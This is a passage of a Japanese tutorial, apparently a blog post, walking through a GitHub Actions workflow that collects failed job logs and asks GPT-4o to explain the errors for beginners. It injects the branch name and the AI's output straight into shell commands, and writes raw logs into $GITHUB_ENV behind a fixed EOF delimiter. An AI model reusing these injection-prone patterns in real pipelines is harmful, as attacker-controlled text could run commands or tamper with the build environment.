data-sourcepos=\"195:1-195:81\">\n<code>Checkout code</code>：チェックアウトとリポジトリのアクセス許可</li>\n<li data-sourcepos=\"196:1-196:46\">\n<code>Get error info</code>：エラーログの取得</li>\n<li data-sourcepos=\"197:1-197:31\">\n<code>Run AI check</code>：AIの分析</li>\n<li data-sourcepos=\"198:1-199:0\">\n<code>Save AI response to summay</code>：分析結果を表示</li>\n</ol>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"200:1-297:3\">\n<div class=\"code-lang\"><span class=\"bold\">ai-failure-check.yml</span></div>\n<div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">AI Failure check</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">workflow_run</span><span class=\"pi\">:</span>\n    <span class=\"na\">workflows</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">Test</span><span class=\"nv\"> </span><span class=\"s\">and</span><span class=\"nv\"> </span><span class=\"s\">Deploy\"</span>\n    <span class=\"na\">types</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">completed</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">on-success</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">${{ github.event.workflow_run.conclusion == 'success' }}</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">success</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow success\"</span>\n  <span class=\"na\">on-failure</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">${{ github.event.workflow_run.conclusion == 'failure' }}</span>\n    <span class=\"na\">permissions</span><span class=\"pi\">:</span>\n      <span class=\"na\">actions</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n      <span class=\"na\">contents</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n      <span class=\"na\">models</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">failure</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow failed\"</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v4</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Get error info</span>\n        <span class=\"na\">id</span><span class=\"pi\">:</span> <span class=\"s\">get-error</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">GITHUB_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.GITHUB_TOKEN }}</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"::error::ワークフロー失敗\"</span>\n          <span class=\"s\">echo \"branch: ${{ github.event.workflow_run.head_branch }}\"</span>\n\n          <span class=\"s\"># ワークフローの実行IDを取得</span>\n          <span class=\"s\">RUN_ID=${{ github.event.workflow_run.id }}</span>\n          <span class=\"s\">echo \"RUN_ID: $RUN_ID\"</span>\n\n          <span class=\"s\"># ワークフロー情報を環境変数に保存</span>\n          <span class=\"s\">echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\"># ジョブの一覧を取得</span>\n          <span class=\"s\">JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')</span>\n\n          <span class=\"s\"># 失敗したジョブのログを取得</span>\n          <span class=\"s\">echo \"FAILED_LOGS&lt;&lt;EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\">for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do</span>\n            <span class=\"s\">echo \"=== Job ID: $job ===\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">gh api repos/${{ github.repository }}/actions/jobs/${job}/logs &gt;&gt; $GITHUB_ENV 2&gt;&amp;1 || echo \"ログの取得に失敗しました\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">done</span>\n\n          <span class=\"s\">echo \"EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run AI check</span>\n        <span class=\"na\">id</span><span class=\"pi\">:</span> <span class=\"s\">ai-check</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/ai-inference@v1</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">model</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">openai/gpt-4o\"</span>\n          <span class=\"na\">prompt</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n            <span class=\"s\">あなたは、エラー解決のプロです。初心者に向けてわかりやすくなぜエラーになったのか、どうすればエラーを解決できるかを教えてください。</span>\n            <span class=\"s\">以下の形式で簡潔に（全体で10行以内）説明してください。</span>\n            <span class=\"s\">エラーの内容は以下です。</span>\n\n            <span class=\"s\">**失敗したワークフロー:**</span>\n            <span class=\"s\">- ワークフロー名: ${{ env.WORKFLOW_NAME }}</span>\n            <span class=\"s\">- ブランチ: ${{ env.BRANCH_NAME }}</span>\n            <span class=\"s\">- コミットSHA: ${{ env.COMMIT_SHA }}</span>\n            <span class=\"s\">- 使用技術: Vite, Supabase, Firebase</span>\n\n            <span class=\"s\">**エラーログ:**</span>\n            <span class=\"s\">```</span>\n            <span class=\"s\">${{ env.FAILED_LOGS }}</span>\n            <span class=\"s\">```</span>\n\n            <span class=\"s\">**回答形式フォーマット:**</span>\n            <span class=\"s\">【原因】1-2行で説明</span>\n            <span class=\"s\">【解決方法】具体的な手順を1-2個</span>\n            <span class=\"s\">【予防策】1つだけ</span>\n\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Save AI response to summary</span>\n        <span class=\"na\">if</span><span class=\"pi\">:</span> <span class=\"s\">always()</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\"># GitHub Actionsのサマリーに出力（Web UIで確認可能）</span>\n          <span class=\"s\">echo \"## 分析結果\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n          <span class=\"s\">echo '${{ steps.ai-check.outputs.response }}' | base64 | base64 -d &gt;&gt; $GITHUB_STEP_SUMMARY</span>\n\n</code></pre></div>\n</div>\n<h3 data-sourcepos=\"299:1-299:15\">\n<span id=\"permissions\" class=\"fragment\"></span><a href=\"#permissions\"><i class=\"fa fa-link\"></i></a>permissions</h3>\n<p data-sourcepos=\"301:1-301:112\"><code>permissions</code>：ワークフローがGitHubのリソースやAPIにアクセスする際の権限を設定する</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"303:1-308:3\"><div class=\"highlight\"><pre><code><span class=\"na\">permissions</span><span class=\"pi\">:</span>\n      <span class=\"na\">actions</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n      <span class=\"na\">contents</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n      <span class=\"na\">models</span><span class=\"pi\">:</span> <span class=\"s\">read</span>\n</code></pre></div></div>\n<p data-sourcepos=\"311:1-311:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"312:1-316:185\">\n<p data-sourcepos=\"312:2-313:133\">permissions を使用して GITHUB_TOKEN に付与された既定のアクセス許可を変更し、必要に応じてアクセスを追加または削除することで、必要最小限のアクセスのみを許可することができます。<br>\nread (該当する場合)、write、または none のいずれかのアクセス レベルを割り当てることができます。</p>\n<blockquote data-sourcepos=\"314:2-316:185\">\n<p data-sourcepos=\"314:3-316:185\"><code>actions</code>:GitHub Actions を操作します。<br>\n<code>contents</code>:リポジトリの内容を操作します。<br>\n<code>models</code>:GitHub Models を使用して AI 推論応答を生成します。たとえば、models: read は、GitHub Models 推論 API を使用するアクションを許可します。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"319:1-319:126\"><iframe id=\"qiita-embed-content__0d596843c2b941a9cee2c1565ee555e9\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0d596843c2b941a9cee2c1565ee555e9\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-what-your-workflow-does%2Fcontrolling-permissions-for-github_token\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"321:1-321:9\">\n<span id=\"steps\" class=\"fragment\"></span><a href=\"#steps\"><i class=\"fa fa-link\"></i></a>steps</h3>\n<h4 data-sourcepos=\"322:1-322:18\">\n<span id=\"name-failure\" class=\"fragment\"></span><a href=\"#name-failure\"><i class=\"fa fa-link\"></i></a>name: failure</h4>\n<p data-sourcepos=\"323:1-323:67\">コンソール上に<code>trigger build workflow failed</code>を表示する</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"325:1-330:3\"><div class=\"highlight\"><pre><code>    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">failure</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"trigger build workflow failed\"</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"332:1-332:24\">\n<span id=\"name-checkout-code\" class=\"fragment\"></span><a href=\"#name-checkout-code\"><i class=\"fa fa-link\"></i></a>name: Checkout code</h4>\n<p data-sourcepos=\"333:1-333:81\">チェックアウトとリポジトリのアクセスをできるようにする</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"335:1-338:3\"><div class=\"highlight\"><pre><code>      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Checkout code</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v4</span>\n</code></pre></div></div>\n<p data-sourcepos=\"340:1-340:22\"><strong>READMEより引用</strong></p>\n<blockquote data-sourcepos=\"341:1-341:177\">\n<p data-sourcepos=\"341:2-341:177\">このアクションは$GITHUB_WORKSPACE配下のリポジトリをチェックアウトし、ワークフローがリポジトリにアクセスできるようにします。</p>\n</blockquote>\n<p data-sourcepos=\"343:1-343:35\"><iframe id=\"qiita-embed-content__7023ef105ff4cbeb63c04c8e4ebcfbcf\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7023ef105ff4cbeb63c04c8e4ebcfbcf\" data-content=\"https%3A%2F%2Fgithub.com%2Factions%2Fcheckout\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h4 data-sourcepos=\"345:1-345:25\">\n<span id=\"name-get-error-info\" class=\"fragment\"></span><a href=\"#name-get-error-info\"><i class=\"fa fa-link\"></i></a>name: Get error info</h4>\n<div data-sourcepos=\"347:1-350:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"348:1-349:75\">以下の方法は、ログを全て取得するため、ログの出力が大きいとエラーになります。<br>\n解決方法を下記にまとめていますのでご参照ください。</p>\n</div>\n</div>\n<p data-sourcepos=\"353:1-353:51\"><iframe id=\"qiita-embed-content__c6259b74e30b660de1511714cd1be064\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c6259b74e30b660de1511714cd1be064\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fadc4a8e7782e89d4d524\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"357:1-357:38\"><code>id</code>:ステップの一意な識別子</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"359:1-362:3\"><div class=\"highlight\"><pre><code><span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Get error info</span>\n        <span class=\"s\">id</span><span class=\"err\">:</span> <span class=\"s\">get-error</span>\n</code></pre></div></div>\n<p data-sourcepos=\"365:1-365:105\"><iframe id=\"qiita-embed-content__4921c68af3461f6be32edef4dedf5996\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4921c68af3461f6be32edef4dedf5996\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fworkflow-syntax-for-github-actions%23jobsjob_idstepsid\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"367:1-367:60\"><code>env</code>:ワークフロー内で使用できる変数を定義</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"369:1-372:3\"><div class=\"highlight\"><pre><code>        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">GITHUB_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.GITHUB_TOKEN }}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"374:1-374:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"375:1-375:114\">\n<p data-sourcepos=\"375:2-375:114\">env：ワークフロー中のすべてのジョブのステップで使うことができる変数の map です</p>\n</blockquote>\n<p data-sourcepos=\"377:1-377:91\"><iframe id=\"qiita-embed-content__828124056bd642fd0446e7eaa08fed24\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__828124056bd642fd0446e7eaa08fed24\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fworkflow-syntax-for-github-actions%23env\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"379:1-380:63\"><code>GITHUB_TOKEN</code>はワークフロー開始時に自動で作成してくれます。<br>\n<code>${{ secrets.GITHUB_TOKEN }} </code>で定義し、使用します。</p>\n<blockquote data-sourcepos=\"382:1-383:82\">\n<p data-sourcepos=\"382:2-382:182\">各ワークフロー ジョブの開始時に、GitHub によって、ワークフローで使用する一意の GITHUB_TOKEN シークレットが自動的に作成されます。</p>\n<blockquote data-sourcepos=\"383:2-383:82\">\n<p data-sourcepos=\"383:3-383:82\">${{ secrets.GITHUB_TOKEN }} を使って、GITHUB_TOKEN を使用できます。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"385:1-385:109\"><iframe id=\"qiita-embed-content__61d60c743ff07db22d065469c95b789e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__61d60c743ff07db22d065469c95b789e\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fsecurity-for-github-actions%2Fsecurity-guides%2Fautomatic-token-authentication\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h5 data-sourcepos=\"387:1-387:44\">\n<span id=\"ワークフローの実行idを取得\" class=\"fragment\"></span><a href=\"#%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC%E3%81%AE%E5%AE%9F%E8%A1%8Cid%E3%82%92%E5%8F%96%E5%BE%97\"><i class=\"fa fa-link\"></i></a>ワークフローの実行IDを取得</h5>\n<p data-sourcepos=\"389:1-391:32\"><code>github.event.workflow_run.~</code>：<code>workflow_run:</code>で指定したワークフロー情報（今回の場合は<code>Test and Deploy</code>の実行結果を格納してくれる）<br>\n<code>head_branch</code>:実行されたブランチ名<br>\n<code>id </code>:ワークフロー実行ID</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"393:1-401:3\"><div class=\"highlight\"><pre><code>        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">echo \"::error::ワークフロー失敗\"</span>\n          <span class=\"s\">echo \"branch: ${{ github.event.workflow_run.head_branch }}\"</span>\n\n          <span class=\"s\"># ワークフローの実行IDを取得</span>\n          <span class=\"s\">RUN_ID=${{ github.event.workflow_run.id }}</span>\n          <span class=\"s\">echo \"RUN_ID: $RUN_ID\"</span>\n</code></pre></div></div>\n<p data-sourcepos=\"404:1-404:128\"><iframe id=\"qiita-embed-content__49b5e796aa32ee8ee13d98f189c3508c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__49b5e796aa32ee8ee13d98f189c3508c\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-when-your-workflow-runs%2Fevents-that-trigger-workflows%23workflow_run\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"406:1-406:76\"><iframe id=\"qiita-embed-content__8a77e0135d22c4f0afc86adcd100defa\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8a77e0135d22c4f0afc86adcd100defa\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Fwebhooks%2Fwebhook-events-and-payloads%23workflow_run\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h5 data-sourcepos=\"408:1-408:54\">\n<span id=\"ワークフロー情報を環境変数に保存\" class=\"fragment\"></span><a href=\"#%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%95%E3%83%AD%E3%83%BC%E6%83%85%E5%A0%B1%E3%82%92%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%AB%E4%BF%9D%E5%AD%98\"><i class=\"fa fa-link\"></i></a>ワークフロー情報を環境変数に保存</h5>\n<p data-sourcepos=\"410:1-413:53\"><code>github.event.workflow_run.~</code>：<code>workflow_run:</code>で指定したワークフロー情報（今回の場合は<code>Test and Deploy</code>の実行結果を格納してくれる）<br>\n<code>name</code>:ワークフロー名<br>\n<code>head_branch</code>:実行されたブランチ名<br>\n<code>head_sha</code>:コミットしたときのハッシュ値</p>\n<p data-sourcepos=\"415:1-415:75\"><code>echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" &gt;&gt; $GITHUB_ENV</code></p>\n<p data-sourcepos=\"417:1-417:81\"><code>&gt;&gt;</code>：ファイルに追記するシェルコマンド(<code>&gt;</code>の場合は上書き)</p>\n<ol data-sourcepos=\"419:1-422:0\">\n<li data-sourcepos=\"419:1-419:111\">\n<code>$GITHUB_ENV</code>ファイルを作成、<code>WORKFLOW_NAME=${{ github.event.workflow_run.name }}</code>を記載、保存</li>\n<li data-sourcepos=\"420:1-420:72\">\n<code>WORKFLOW_NAME=${{ github.event.workflow_run.head_branch }}</code>を追記</li>\n<li data-sourcepos=\"421:1-422:0\">\n<code>WORKFLOW_NAME=${{ github.event.workflow_run.head_sha }}</code>を追記</li>\n</ol>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"423:1-428:3\"><div class=\"highlight\"><pre><code>          <span class=\"c1\"># ワークフロー情報を環境変数に保存</span>\n          <span class=\"s\">echo \"WORKFLOW_NAME=${{ github.event.workflow_run.name }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"BRANCH_NAME=${{ github.event.workflow_run.head_branch }}\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">echo \"COMMIT_SHA=${{ github.event.workflow_run.head_sha }}\" &gt;&gt; $GITHUB_ENV</span>\n</code></pre></div></div>\n<h5 data-sourcepos=\"430:1-430:33\">\n<span id=\"ジョブの一覧を取得\" class=\"fragment\"></span><a href=\"#%E3%82%B8%E3%83%A7%E3%83%96%E3%81%AE%E4%B8%80%E8%A6%A7%E3%82%92%E5%8F%96%E5%BE%97\"><i class=\"fa fa-link\"></i></a>ジョブの一覧を取得</h5>\n<p data-sourcepos=\"432:1-432:48\"><strong>GitHub CLI(gh)を使ってapiを呼び出す</strong></p>\n<p data-sourcepos=\"434:1-434:67\"><code>gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs</code></p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"436:1-439:3\"><div class=\"highlight\"><pre><code>          <span class=\"c1\"># ジョブの一覧を取得</span>\n          <span class=\"s\">JOBS=$(gh api repos/${{ github.repository }}/actions/runs/${RUN_ID}/jobs --jq '.jobs')</span>\n</code></pre></div></div>\n<p data-sourcepos=\"441:1-443:133\"><code>gh</code>: GitHub CLIを使用するコマンド<br>\n<code>api</code>: APIを呼び出す<br>\n<code>repos/\\\\${{ github.repository }}/actions/runs/${RUN_ID}/jobs</code>: エンドポイント、実行したワークフローのjobを取得</p>\n<p data-sourcepos=\"445:1-445:65\"><iframe id=\"qiita-embed-content__04bccbb41d70d65ba939ab54b30b415f\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__04bccbb41d70d65ba939ab54b30b415f\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Fgithub-cli%2Fgithub-cli%2Fabout-github-cli\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"447:1-447:36\"><iframe id=\"qiita-embed-content__c4bc6f6f472a9b38fce4375d66fd8bf6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c4bc6f6f472a9b38fce4375d66fd8bf6\" data-content=\"https%3A%2F%2Fcli.github.com%2Fmanual%2Fgh_api\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h5 data-sourcepos=\"449:1-449:45\">\n<span id=\"失敗したジョブのログを取得\" class=\"fragment\"></span><a href=\"#%E5%A4%B1%E6%95%97%E3%81%97%E3%81%9F%E3%82%B8%E3%83%A7%E3%83%96%E3%81%AE%E3%83%AD%E3%82%B0%E3%82%92%E5%8F%96%E5%BE%97\"><i class=\"fa fa-link\"></i></a>失敗したジョブのログを取得</h5>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"451:1-462:3\"><div class=\"highlight\"><pre><code>          <span class=\"c1\"># 失敗したジョブのログを取得</span>\n          <span class=\"s\">echo \"FAILED_LOGS&lt;&lt;EOF\" &gt;&gt; $GITHUB_ENV</span>\n\n          <span class=\"s\">for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do</span>\n            <span class=\"s\">echo \"=== Job ID</span><span class=\"err\">:</span> <span class=\"s\">$job ===\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">gh api repos/${{ github.repository }}/actions/jobs/${job}/logs &gt;&gt; $GITHUB_ENV 2&gt;&amp;1 || echo \"ログの取得に失敗しました\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">done</span>\n\n          <span class=\"s\">echo \"EOF\" &gt;&gt; $GITHUB_ENV</span>\n</code></pre></div></div>\n<p data-sourcepos=\"464:1-466:107\"><code>echo \"FAILED_LOGS&lt;&lt;EOF\" &gt;&gt; $GITHUB_ENV</code>:$GITHUB_ENVファイルにFAILED_LOGS&lt;&lt;EOFを追記<br>\n<code>FAILED_LOGS&lt;&lt;EOF</code>：環境変数FAILED_LOGSを設定<br>\n<code>&lt;&lt;EOF</code>:ヒアドキュメント、EOFという文字列が現れるまで、複数行の値として扱う</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"467:1-475:3\"><div class=\"highlight\"><pre><code>          <span class=\"s\">for job in $(echo \"$JOBS\" | jq -r '.[] | select(.conclusion == \"failure\") | .id'); do</span>\n            <span class=\"s\">echo \"=== Job ID</span><span class=\"err\">:</span> <span class=\"s\">$job ===\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">gh api repos/${{ github.repository }}/actions/jobs/${job}/logs &gt;&gt; $GITHUB_ENV 2&gt;&amp;1 || echo \"ログの取得に失敗しました\" &gt;&gt; $GITHUB_ENV</span>\n            <span class=\"s\">echo \"\" &gt;&gt; $GITHUB_ENV</span>\n          <span class=\"s\">done</span>\n\n          <span class=\"s\">echo \"EOF\" &gt;&gt; $GITHUB_ENV</span>\n</code></pre></div></div>\n<p data-sourcepos=\"477:1-481:38\"><code>$JOBS</code>：ジョブ一覧を格納<br>\n<code>jq -r '.[]</code>：<code>jq</code> jsonを取り扱うコマンド、<code>-r</code> オプションを直接取り扱う、<code>.[]</code>JSON配列の各要素をループして取り出す<br>\n<code>select(.conclusion == \"failure\")</code>:conclusionが\"failure\"のもののみ取得<br>\n<code>.id</code>：idだけ取り出す<br>\n取り出したものは<code>job</code>に格納</p>\n<p data-sourcepos=\"483:1-483:111\"><code>echo \"=== Job ID: $job ===\" &gt;&gt; $GITHUB_ENV</code>：=== Job ID: $job ===取り出したjob(id)をGITHUB_ENVに追記</p>\n<p data-sourcepos=\"485:1-487:97\"><code>gh api repos/${{ github.repository }}/actions/jobs/${job}/logs &gt;&gt; $GITHUB_ENV 2&gt;&amp;1 || echo \"ログの取得に失敗しました\" &gt;&gt; $GITHUB_ENV</code><br>\nidのlogsをGITHUB_ENVに追記、<code>2&gt;&amp;1</code>は2は標準エラー出力、&gt;&amp;1は標準出力にリダイレクトする（エラーメッセージも通常の出力としてファイルに書き込む）<br>\n|| はOR演算子、左側のコマンドが失敗したら（false）の右側の処理を行う</p>\n<p data-sourcepos=\"489:1-489:29\"><code> |</code>：YAMLの複数行記法</p>\n<h4 data-sourcepos=\"491:1-491:23\">\n<span id=\"name-run-ai-check\" class=\"fragment\"></span><a href=\"#name-run-ai-check\"><i class=\"fa fa-link\"></i></a>name: Run AI check</h4>\n<p data-sourcepos=\"493:1-495:35\"><code>uses</code>: <code>actions/ai-inference@v1</code>を指定<br>\n<code>model</code>: AIのモデルを指定<br>\n<code>prompt</code>:プロンプトを指定</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"497:1-523:3\"><div class=\"highlight\"><pre><code>      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run AI check</span>\n        <span class=\"na\">id</span><span class=\"pi\">:</span> <span class=\"s\">ai-check</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/ai-inference@v1</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">model</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">openai/gpt-4o\"</span>\n          <span class=\"na\">prompt</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n            <span class=\"s\">あなたは、エラー解決のプロです。初心者に向けてわかりやすくなぜエラーになったのか、どうすればエラーを解決できるかを教えてください。</span>\n            <span class=\"s\">以下の形式で簡潔に（全体で10行以内）説明してください。</span>\n            <span class=\"s\">エラーの内容は以下です。</span>\n\n            <span class=\"s\">**失敗したワークフロー:**</span>\n            <span class=\"s\">- ワークフロー名: ${{ env.WORKFLOW_NAME }}</span>\n            <span class=\"s\">- ブランチ: ${{ env.BRANCH_NAME }}</span>\n            <span class=\"s\">- コミットSHA: ${{ env.COMMIT_SHA }}</span>\n            <span class=\"s\">- 使用技術: Vite, Supabase, Firebase</span>\n\n            <span class=\"s\">**エラーログ:**</span>\n            <span class=\"s\">```</span>\n            <span class=\"s\">${{ env.FAILED_LOGS }}</span>\n            <span class=\"s\">```</span>\n\n            <span class=\"s\">**回答形式フォーマット:**</span>\n            <span class=\"s\">【原因】1-2行で説明</span>\n            <span class=\"s\">【解決方法】具体的な手順を1-2個</span>\n            <span class=\"s\">【予防策】1つだけ</span>\n</code></pre></div></div>\n<h4 data-sourcepos=\"525:1-525:38\">\n<span id=\"name-save-ai-response-to-summary\" class=\"fragment\"></span><a href=\"#name-save-ai-response-to-summary\"><i class=\"fa fa-link\"></i></a>name: Save AI response to summary</h4>\n<p data-sourcepos=\"527:1-527:77\"><code>if: always()</code>前のステップに関係なくステップを実行できる</p>\n<p data-sourcepos=\"529:1-529:154\"><iframe id=\"qiita-embed-content__90b2b5985595292dda95b0cba5f51cdc\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__90b2b5985595292dda95b0cba5f51cdc\" data-content=\"https%3A%2F%2Fdocs.github.com%2Fja%2Factions%2Fwriting-workflows%2Fchoosing-what-your-workflow-does%2Fevaluate-expressions-in-workflows-and-actions%23status-check-functions\" 